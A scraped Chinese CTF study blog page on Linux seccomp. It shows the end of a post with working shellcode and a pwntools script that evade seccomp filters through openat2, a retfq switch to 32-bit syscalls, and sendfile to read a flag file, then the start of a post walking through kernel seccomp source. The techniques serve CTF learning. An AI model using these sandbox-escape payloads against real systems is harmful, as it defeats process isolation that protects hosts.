<p>这个函数封装了三个参数到结构体<code>how</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_how</span> &#123;</span></span><br><span class="line">	__u64 flags;</span><br><span class="line">	__u64 mode;</span><br><span class="line">	__u64 resolve;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>dfd</code>与另外3个参数的使用方式与<code>openat</code>相同，<code>resolve</code>指解析路径名所有组件的方式，普通的打开文件操作填0即可。参数<code>size</code>必须为结构体<code>open_how</code>的大小，也就是<code>0x18</code>。</p>
<p>实例代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0x67616c662f2e</span></span><br><span class="line">push rax</span><br><span class="line">xor rdi, rdi</span><br><span class="line">sub rdi, <span class="number">100</span></span><br><span class="line">mov rsi, rsp</span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov r10, <span class="number">0x18</span></span><br><span class="line">push SYS_openat2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h1 id="0x05-execve-open-openat-openat2"><a class="markdownIt-Anchor" href="#0x05-execve-open-openat-openat2"></a> 0x05. execve + open + openat + openat2</h1>
<p>如果题目禁用了x64的所有3个打开文件的系统调用，此时还有一种情况使得我们可以成功打开文件并获取文件描述符：当seccomp没有禁用x64的fstat系统调用时，可以通过将程序暂时转换为32位模式再通过<code>open</code>系统调用打开文件，因为32位的<code>open</code>系统调用与64位的不同，32位<code>open</code>的系统调用号为5，对应x64的系统调用表中为<code>fstat</code>系统调用。</p>
<p><code>retfq</code>指令，在x86-64中可用于将程序从64位长模式转换为32位模式，在转换时需要注意修改栈地址为32位地址，并向栈中保存一些特定值，在64位系统中，<code>cs</code>寄存器的值为0x23时表示当前程序处于32位状态，值为0x33时表示当前程序处于64位状态。在执行<code>retfq</code>指令之前，我们就应该修改<code>rsp</code>，并将0x23和要执行的32位指令地址push进栈。在执行<code>retfq</code>后，程序将自动转到32位环境中工作。在32位代码执行结束后，如果需要返回到64位状态，可通过<code>jmp 0x33:xxxxx ; ret</code>的指令返回到64位代码。</p>
<p>注意：如果在执行<code>retfq</code>时<code>rsp</code>高位的任何值都会被直接舍弃，只取低32位作为新的栈地址，而这个地址通常是不能预先获取的，因此<code>retfq</code>前重新赋值<code>rsp</code>很有必要。</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_64_1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov r10, 0x21</span></span><br><span class="line"><span class="string">    mov r8, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">    xor r9, r9</span></span><br><span class="line"><span class="string">    push SYS_mmap</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    mov rcx, 0x200</span></span><br><span class="line"><span class="string">    mov rdi, 0x10000</span></span><br><span class="line"><span class="string">    mov rsi, 0x600000000100</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rsp, 0x10800</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x10000</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_32 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	mov eax, 0x6761</span></span><br><span class="line"><span class="string">	push eax</span></span><br><span class="line"><span class="string">	mov eax, 0x6c662f2e</span></span><br><span class="line"><span class="string">	push eax</span></span><br><span class="line"><span class="string">	mov ebx, esp</span></span><br><span class="line"><span class="string">	xor ecx, ecx</span></span><br><span class="line"><span class="string">	xor edx, edx</span></span><br><span class="line"><span class="string">	mov eax, 5</span></span><br><span class="line"><span class="string">	int 0x80</span></span><br><span class="line"><span class="string">	jmp 0x33:0x10100</span></span><br><span class="line"><span class="string">	ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_64_2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 3</span></span><br><span class="line"><span class="string">    push 0x100</span></span><br><span class="line"><span class="string">    lea rbx, [rsp-8]</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    push SYS_preadv2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x1</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push 0x100</span></span><br><span class="line"><span class="string">    lea rbx, [rsp+8]</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_writev</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">payload = asm(shellcode_64_1).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += asm(shellcode_32, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += asm(shellcode_64_2)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>需要注意的是32位的系统调用使用的是<code>int 0x80</code>指令触发，且传参使用的寄存器也有所不同（<code>rbx</code>、<code>rcx</code>、<code>rdx</code>、<code>rsi</code>、<code>rdi</code>）。既然转到32位可以绕过基于系统调用号的检查，那么自然而然地，我们也可以进行扩展，如果禁用了64位的所有<code>read</code>与<code>write</code>，或许也可以通过使用32位的<code>read</code>和<code>write</code>相关系统调用完成读写操作。这一部分就交给读者自行探索。</p>
<h1 id="0x06-其他"><a class="markdownIt-Anchor" href="#0x06-其他"></a> 0x06. 其他</h1>
<p>如果题目禁用了所有与<code>read</code>和<code>write</code>相关，也就是上面提到的与读写相关的所有系统调用，我们又应该如何应对呢？实际上seccomp的绕过姿势有很多，这里介绍一下sendfile，至于其他的技巧将在下一篇文章中介绍。</p>
<h2 id="a-sendfile-nr40"><a class="markdownIt-Anchor" href="#a-sendfile-nr40"></a> A. sendfile (nr=40)</h2>
<p>这是一个很好用的系统调用，它允许将文件数据从一个文件描述符直接发送到另一个文件描述符，而且不需要经过缓冲区拷贝，被称为“零拷贝技术”，这一技术也被应用于<code>mmap</code>等系统调用中。可以说这个系统调用用起来比<code>read</code>+<code>write</code>还要简单。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span>* offset, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, 3</span><br><span class="line">push 0</span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov r10, 0x100</span><br><span class="line">push SYS_sendfile</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/29/seccomp%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/29/seccomp%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">seccomp学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-29 15:20:25" itemprop="dateCreated datePublished" datetime="2023-10-29T15:20:25+08:00">2023-10-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-31 11:43:34" itemprop="dateModified" datetime="2023-10-31T11:43:34+08:00">2023-10-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/seccomp-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">seccomp 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天打了ACTF-2023，惊呼已经不认识seccomp了，在被一道盲打题折磨了一整天之后，实在是不想面向题目高强度学习了。但是seccomp这个东西必然是要系统性的重学一遍了，绝不能把知识面仅限于orw。</p>
<p>学习目标：了解seccomp的保护原理，掌握常用的seccomp绕过姿势，学会手写seccomp BPF指令等。</p>
<h1 id="0x01-seccomp规则添加原理"><a class="markdownIt-Anchor" href="#0x01-seccomp规则添加原理"></a> 0x01. seccomp规则添加原理</h1>
<p>说到seccomp，都知道它是用来限制进程的系统调用的，但是对于Linux系统而言，有这么多的进程，seccomp又是如何精准拦截定义了规则的进程中调用的非法的系统调用呢？</p>
<p>这就又不得不进入一个令人不适的环节了——Linux源代码阅读。</p>
<p>在目前使用的Linux系统中，有两个系统调用与seccomp有关，一个是<code>prctl</code>，另一个是<code>seccomp</code>，系统调用号分别为157和317，对应的内核函数为<code>sys_prctl</code>和<code>sys_seccomp</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(seccomp, <span class="type">unsigned</span> <span class="type">int</span>, op, <span class="type">unsigned</span> <span class="type">int</span>, flags,</span><br><span class="line">			 <span class="type">void</span> __user *, uargs)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_seccomp(op, flags, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> PR_GET_SECCOMP:</span><br><span class="line">            error = prctl_get_seccomp();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PR_SET_SECCOMP:</span><br><span class="line">            error = prctl_set_seccomp(arg2, (<span class="type">char</span> __user *)arg3);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">prctl_set_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode, <span class="type">void</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line">	<span class="type">void</span> __user *uargs;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (seccomp_mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">		op = SECCOMP_SET_MODE_STRICT;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Setting strict mode through prctl always ignored filter,</span></span><br><span class="line"><span class="comment">		 * so make sure it is always NULL here to pass the internal</span></span><br><span class="line"><span class="comment">		 * check in do_seccomp().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		uargs = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">		op = SECCOMP_SET_MODE_FILTER;</span><br><span class="line">		uargs = filter;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* prctl interface doesn&#x27;t have flags, so they are always zero. */</span></span><br><span class="line">	<span class="keyword">return</span> do_seccomp(op, <span class="number">0</span>, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，如果将<code>prctl</code>系统调用的第一个参数设置为<code>PR_SET_SECCOMP</code>，最终调用的与<code>sys_seccomp</code>相同，都是<code>do_seccomp</code>。这也是设置<code>seccomp</code>规则的入口函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Common entry point for both prctl and syscall. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> op, <span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">		       <span class="type">void</span> __user *uargs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> (op) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_SET_MODE_STRICT:</span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span> || uargs != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">return</span> seccomp_set_mode_strict();</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_SET_MODE_FILTER:</span><br><span class="line">		<span class="keyword">return</span> seccomp_set_mode_filter(flags, uargs);</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_GET_ACTION_AVAIL:</span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> seccomp_get_action_avail(uargs);</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_GET_NOTIF_SIZES:</span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> seccomp_get_notif_sizes(uargs);</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就是<code>do_seccomp</code>函数的定义。我们要重点关注的是前面两个switch分支，一个是<code>SECCOMP_SET_MODE_STRICT</code></p>
<h2 id="a-默认规则"><a class="markdownIt-Anchor" href="#a-默认规则"></a> A. 默认规则</h2>
<p>添加默认规则的逻辑在<code>seccomp_set_mode_strict</code>中实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">seccomp_set_mode_strict</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> seccomp_mode = SECCOMP_MODE_STRICT;</span><br><span class="line">	<span class="type">long</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">	spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!seccomp_may_assign_mode(seccomp_mode))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TIF_NOTSC</span></span><br><span class="line">	disable_TSC();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	seccomp_assign_mode(current, seccomp_mode, <span class="number">0</span>);</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">seccomp_may_assign_mode</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert_spin_locked(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;seccomp.mode &amp;&amp; current-&gt;seccomp.mode != seccomp_mode)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER 1</span></span><br></pre></td></tr></table></figure>
<p>函数中的<code>current</code>是一个<code>task_struct</code>实例，表示当前内核进程。在加锁之后，调用了一个<code>seccomp_may_assign_mode</code>函数用于判断。从这个判断函数可以发现，当我们使用BPF定义规则（此时mode为<code>SECCOMP_MODE_FILTER</code>）时，就不能再切换成严格模式了，否则该函数返回<code>false</code>，直接跳过了规则修改流程。</p>
<p>随后进入主要的规则添加逻辑<code>seccomp_assign_mode</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">seccomp_assign_mode</span><span class="params">(<span class="keyword">struct</span> task_struct *task,</span></span><br><span class="line"><span class="params">				       <span class="type">unsigned</span> <span class="type">long</span> seccomp_mode,</span></span><br><span class="line"><span class="params">				       <span class="type">unsigned</span> <span class="type">long</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert_spin_locked(&amp;task-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	task-&gt;seccomp.mode = seccomp_mode;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Make sure SYSCALL_WORK_SECCOMP cannot be set before the mode (and</span></span><br><span class="line"><span class="comment">	 * filter) is set.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	smp_mb__before_atomic();</span><br><span class="line">	<span class="comment">/* Assume default seccomp processes want spec flaw mitigation. */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SECCOMP_FILTER_FLAG_SPEC_ALLOW) == <span class="number">0</span>)</span><br><span class="line">		arch_seccomp_spec_mitigate(task);</span><br><span class="line">	set_task_syscall_work(task, SECCOMP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Valid flags for SECCOMP_SET_MODE_FILTER */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_TSYNC		(1UL &lt;&lt; 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_LOG			(1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_SPEC_ALLOW		(1UL &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_NEW_LISTENER	(1UL &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_TSYNC_ESRCH		(1UL &lt;&lt; 4)</span></span><br><span class="line"><span class="comment">/* Received notifications wait in killable state (only respond to fatal signals) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_WAIT_KILLABLE_RECV	(1UL &lt;&lt; 5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_task_syscall_work(t, fl) \</span></span><br><span class="line"><span class="meta">	set_bit(SYSCALL_WORK_BIT_##fl, &amp;task_thread_info(t)-&gt;syscall_work)</span></span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">syscall_work_bit</span> &#123;</span></span><br><span class="line">	SYSCALL_WORK_BIT_SECCOMP,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_TRACEPOINT,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_TRACE,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_EMU,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_AUDIT,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_USER_DISPATCH,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_EXIT_TRAP,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在这个函数之中，设置了当前进程的<code>mode</code>，随后出现了一个判断，判断成功时执行<code>arch_seccomp_spec_mitigate</code>函数。这个函数的内部逻辑比较复杂，先略过。最后调用<code>set_task_syscall_work</code>，这是一个宏定义，定义如上所示，就是设置一个位，表示这个线程已经开启了seccomp检查。</p>
<h2 id="b-自定义规则"><a class="markdownIt-Anchor" href="#b-自定义规则"></a> B. 自定义规则</h2>
